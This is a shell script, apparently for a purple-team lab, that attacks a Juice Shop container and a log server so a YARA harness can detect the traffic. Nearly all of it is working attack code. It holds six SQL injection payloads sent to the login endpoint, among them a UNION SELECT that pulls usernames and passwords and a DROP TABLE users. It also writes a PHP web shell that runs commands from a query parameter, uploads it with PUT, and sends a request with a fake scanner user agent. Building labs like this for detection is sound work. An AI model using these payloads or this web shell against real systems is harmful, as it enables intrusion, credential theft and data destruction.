#!/bin/sh
# attacks/run_attacks.sh
# SQLi variants + upload + UA — improved logging for PurpleLab-lite

set -eu

# ---- config ----
SLEEP_BEFORE=2          # small initial wait
JUICE_HOST="http://juice:3000"
SQLI_ENDPOINT="${JUICE_HOST}/rest/user/login"
LOGSRV_UPLOAD_URL="http://logsrv:80/uploads"
UA="Mozilla/5.0 (evil-scanner)"
MAX_SNIPPET=200
ATTACKER_LOG="/tmp/attacker_run.log"
HOST_LOG_DIR="/app/logs"   # harness mounts project to /app when running in harness container
# ---------------------

timestamp() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
log() {
  msg="$1"
  echo "$(timestamp) | ${msg}" >> "${ATTACKER_LOG}"
  echo "$(timestamp) | ${msg}"
}

# start fresh attacker log (append if already exists)
: > "${ATTACKER_LOG}"
log "Run start"

# ensure curl available
if ! command -v curl >/dev/null 2>&1; then
  log "[!] curl not found in PATH. Exiting."
  exit 0
fi

# wait a little before probing
sleep "${SLEEP_BEFORE}"

# wait for Juice Shop to be reachable (timeout 60s)
log "Waiting for Juice Shop (up to 60s)..."
timeout=60
elapsed=0
while [ "${elapsed}" -lt "${timeout}" ]; do
  HTTP=$(curl -sS -o /dev/null -w "%{http_code}" "${JUICE_HOST}/" || echo "000")
  if [ "${HTTP}" = "200" ] || [ "${HTTP}" = "302" ]; then
    log "Juice Shop reachable (HTTP ${HTTP})"
    break
  fi
  sleep 2
  elapsed=$((elapsed + 2))
  log "Waiting... (${elapsed}s)"
done

# prepare payloads
i=0
i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin@example.com'"' OR 1=1 --","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin@example.com OR 1=1","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin' UNION SELECT username, password FROM Users --","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin' OR SLEEP(5) --","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin'; DROP TABLE users; --","password":"x"}
EOF

i=$((i+1))
cat > /tmp/payload_${i}.json <<'EOF'
{"email":"alice' -- ","password":"x"}
EOF

TOTAL=$i
log "Prepared ${TOTAL} SQLi payloads."

# copy payloads to host logs dir (if available) so YARA inside harness can scan them
if [ -d "${HOST_LOG_DIR}" ] && [ -w "${HOST_LOG_DIR}" ]; then
  log "Host log dir ${HOST_LOG_DIR} writable — copying payloads for detection."
  cp /tmp/payload_*.json "${HOST_LOG_DIR}/" || true
  ls -la "${HOST_LOG_DIR}" | sed -n '1,20p' >> "${ATTACKER_LOG}" || true
else
  log "Host log dir ${HOST_LOG_DIR} not available or not writable — skipping copy."
fi

# send payloads
p=1
while [ "${p}" -le "${TOTAL}" ]; do
  PAY="/tmp/payload_${p}.json"
  RESP="/tmp/resp_${p}.txt"
  log "Sending payload ${p}/${TOTAL} -> ${PAY}"
  HTTP=$(curl -sS -o "${RESP}" -w "%{http_code}" -X POST -H "Content-Type: application/json" --data-binary @"${PAY}" "${SQLI_ENDPOINT}" || echo "000")
  if [ -s "${RESP}" ]; then
    # strip HTML tags for readability and limit length
    SNIPPET=$(head -c ${MAX_SNIPPET} "${RESP}" | sed -E 's/<[^>]*>//g' | tr -d '\r\n')
  else
    SNIPPET="(empty)"
  fi
  log "PAYLOAD ${p} | HTTP ${HTTP} | SNIPPET: ${SNIPPET}"
  p=$((p+1))
done

# create timestamped webshell and upload it
TS="$(date +%s)"
SHELL_NAME="shell_${TS}.php"
TMP="/tmp/${SHELL_NAME}"
echo "<?php system(\$_GET['cmd']); ?>" > "${TMP}"
log "Created webshell ${TMP}"

log "Uploading ${SHELL_NAME} to ${LOGSRV_UPLOAD_URL}/"
UPLOAD_HTTP=$(curl -sS -o /tmp/upload_resp -w "%{http_code}" -X PUT --data-binary @"${TMP}" "${LOGSRV_UPLOAD_URL}/${SHELL_NAME}" || echo "000")
log "Upload HTTP ${UPLOAD_HTTP} -> ${SHELL_NAME}"

# send suspicious UA to create log entry
log "Sending suspicious UA request..."
curl -sS -A "${UA}" "${LOGSRV_UPLOAD_URL%/uploads/}" >/dev/null 2>&1 || true

# cleanup local tmp files (keep attacker log)
rm -f /tmp/payload_*.json /tmp/resp_*.txt /tmp/upload_resp "${TMP}" || true
log "Cleaned temporary files. Attacks done. Uploaded: ${SHELL_NAME}"

# final note: print where attacker log is stored
log "ATTACK LOG WRITTEN: ${ATTACKER_LOG}"
